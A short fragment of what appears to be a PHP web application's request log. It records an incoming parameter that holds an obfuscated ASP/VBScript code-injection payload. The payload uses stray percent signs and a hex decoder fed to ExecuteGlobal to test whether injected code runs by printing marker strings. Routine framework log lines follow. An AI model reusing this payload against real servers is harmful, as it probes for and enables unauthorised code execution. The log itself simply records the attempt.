+  'a' => '%u0045%xec%ute%G%loba%l%(Replace("Fu%nct%ion bd(by%V%al s):Fo%r i%=1 T%o Le%n(s) S%te%p 2:c%=M%id(s,i,2):If Is%Nu%meric(M%id(s,i,1)) T%hen:bd%=bd@26@c%hr(""@26@H""@26@c):E%lse:bd%=bd@26@c%hr(""@26@H""@26@c@26@M%id(s,i+2,2)):i%=i+2:E%nd If:Ne%xt:E%nd Fu%nct%ion:E%xecu%te%(bd%(""4f6e204572726f7220526573756d65204e6578743a526573706f6e73652e57726974652022402a6c786c2a40223a526573706F6E73652E577269746528224C584C22293a526573706f6e73652e577269746520222a406c786c402a223a526573706f6e73652e456e64"")%)","@26@",chr(38)))',
+)
+[ info ] [ LANG ] /www/wwwroot/fw366.cn/public/../application/api/lang/zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.002009s ]
+[ info ] [ LOG ] INIT File
